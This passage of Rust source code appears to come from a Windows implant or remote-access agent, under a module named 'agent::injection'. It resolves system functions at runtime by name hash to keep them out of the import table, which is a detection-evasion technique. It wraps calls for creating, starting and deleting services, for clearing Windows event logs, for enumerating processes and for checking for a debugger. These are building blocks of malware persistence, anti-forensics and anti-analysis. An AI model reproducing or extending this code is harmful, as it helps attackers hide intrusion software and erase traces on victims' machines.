            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateServiceA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hSCManager, lpServiceName, lpDisplayName, dwDesiredAccess, dwServiceType, dwStartType, dwErrorControl, lpBinaryPathName, lpLoadOrderGroup, lpdwTagId, lpDependencies, lpServiceStartName, lpPassword) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn StartServiceA(hService: HANDLE, dwNumServiceArgs: DWORD, lpServiceArgVectors: *const *const i8) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, DWORD, *const *const i8) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"StartServiceA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hService, dwNumServiceArgs, lpServiceArgVectors) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn ControlService(hService: HANDLE, dwControl: DWORD, lpServiceStatus: *mut ServiceStatus) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, DWORD, *mut ServiceStatus) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ControlService")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hService, dwControl, lpServiceStatus) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn DeleteService(hService: HANDLE) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteService")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hService) }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Windows Event Log FFI (wevtapi)
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod evtlog_ext {
    use std::ffi::c_void;
    pub type EVT_HANDLE = *mut c_void;
    pub type DWORD      = u32;
    pub type BOOL       = i32;

    pub const EVT_QUERY_CHANNEL_PATH:      DWORD = 0x1;
    pub const EVT_QUERY_REVERSE_DIRECTION: DWORD = 0x200;
    pub const EVT_RENDER_EVENT_XML:        DWORD = 1;

    /// Lazily resolved from wevtapi.dll by name hash (import-table hygiene).
    pub unsafe fn EvtQuery(Session: EVT_HANDLE, Path: *const u16, Query: *const u16, Flags: DWORD) -> EVT_HANDLE {
        type F = unsafe extern "system" fn(EVT_HANDLE, *const u16, *const u16, DWORD) -> EVT_HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"wevtapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EvtQuery")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(Session, Path, Query, Flags) }
    }
    /// Lazily resolved from wevtapi.dll by name hash (import-table hygiene).
    pub unsafe fn EvtNext(ResultSet: EVT_HANDLE, EventArraySize: DWORD, EventArray: *mut EVT_HANDLE, Timeout: DWORD, Flags: DWORD, Returned: *mut DWORD) -> BOOL {
        type F = unsafe extern "system" fn(EVT_HANDLE, DWORD, *mut EVT_HANDLE, DWORD, DWORD, *mut DWORD) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"wevtapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EvtNext")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(ResultSet, EventArraySize, EventArray, Timeout, Flags, Returned) }
    }
    /// Lazily resolved from wevtapi.dll by name hash (import-table hygiene).
    pub unsafe fn EvtRender(Context: EVT_HANDLE, Fragment: EVT_HANDLE, Flags: DWORD, BufferSize: DWORD, Buffer: *mut c_void, BufferUsed: *mut DWORD, PropertyCount: *mut DWORD) -> BOOL {
        type F = unsafe extern "system" fn(EVT_HANDLE, EVT_HANDLE, DWORD, DWORD, *mut c_void, *mut DWORD, *mut DWORD) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"wevtapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EvtRender")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(Context, Fragment, Flags, BufferSize, Buffer, BufferUsed, PropertyCount) }
    }
    /// Lazily resolved from wevtapi.dll by name hash (import-table hygiene).
    pub unsafe fn EvtClearLog(Session: EVT_HANDLE, ChannelPath: *const u16, TargetFilePath: *const u16, Flags: DWORD) -> BOOL {
        type F = unsafe extern "system" fn(EVT_HANDLE, *const u16, *const u16, DWORD) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"wevtapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EvtClearLog")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(Session, ChannelPath, TargetFilePath, Flags) }
    }
    /// Lazily resolved from wevtapi.dll by name hash (import-table hygiene).
    pub unsafe fn EvtClose(Object: EVT_HANDLE) -> BOOL {
        type F = unsafe extern "system" fn(EVT_HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"wevtapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EvtClose")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(Object) }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Additional kernel32 (mutex + process info)
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod proc_ext {
    use std::ffi::c_void;
    pub type HANDLE = *mut c_void;
    pub type DWORD  = u32;
    pub type BOOL   = i32;
    pub const MUTEX_ALL_ACCESS: DWORD = 0x1F0001;
    pub const TH32CS_SNAPPROCESS: DWORD = 0x00000002;

    #[repr(C)]
    pub struct ProcessEntry32W {
        pub dw_size:               DWORD,
        pub cnt_usage:             DWORD,
        pub th32_process_id:       DWORD,
        pub th32_default_heap_id:  usize,
        pub th32_module_id:        DWORD,
        pub cnt_threads:           DWORD,
        pub th32_parent_process_id: DWORD,
        pub pc_pri_class_base:     i32,
        pub dw_flags:              DWORD,
        pub sz_exe_file:           [u16; 260],
    }

    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn CreateMutexA(lpMutexAttributes: *mut c_void, bInitialOwner: BOOL, lpName: *const i8) -> HANDLE {
        type F = unsafe extern "system" fn(*mut c_void, BOOL, *const i8) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateMutexA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(lpMutexAttributes, bInitialOwner, lpName) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn OpenMutexA(dwDesiredAccess: DWORD, bInheritHandle: BOOL, lpName: *const i8) -> HANDLE {
        type F = unsafe extern "system" fn(DWORD, BOOL, *const i8) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenMutexA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(dwDesiredAccess, bInheritHandle, lpName) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn ReleaseMutex(hMutex: HANDLE) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ReleaseMutex")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hMutex) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn QueryFullProcessImageNameW(hProcess: HANDLE, dwFlags: DWORD, lpExeName: *mut u16, lpdwSize: *mut DWORD) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, DWORD, *mut u16, *mut DWORD) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"QueryFullProcessImageNameW")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hProcess, dwFlags, lpExeName, lpdwSize) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE {
        type F = unsafe extern "system" fn(DWORD, DWORD) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateToolhelp32Snapshot")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(dwFlags, th32ProcessID) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn Process32FirstW(hSnapshot: HANDLE, lppe: *mut ProcessEntry32W) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, *mut ProcessEntry32W) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Process32FirstW")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hSnapshot, lppe) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn Process32NextW(hSnapshot: HANDLE, lppe: *mut ProcessEntry32W) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, *mut ProcessEntry32W) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Process32NextW")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hSnapshot, lppe) }
    }
    /// Lazily resolved from psapi.dll by name hash (import-table hygiene).
    pub unsafe fn GetModuleFileNameExW(hProcess: HANDLE, hModule: HANDLE, lpFilename: *mut u16, nSize: DWORD) -> DWORD {
        type F = unsafe extern "system" fn(HANDLE, HANDLE, *mut u16, DWORD) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"psapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleFileNameExW")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hProcess, hModule, lpFilename, nSize) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn IsDebuggerPresent() -> BOOL {
        type F = unsafe extern "system" fn() -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"IsDebuggerPresent")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f() }
    }

    pub fn wstr_to_string(buf: &[u16]) -> String {
        let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
        String::from_utf16_lossy(&buf[..end])
    }
}
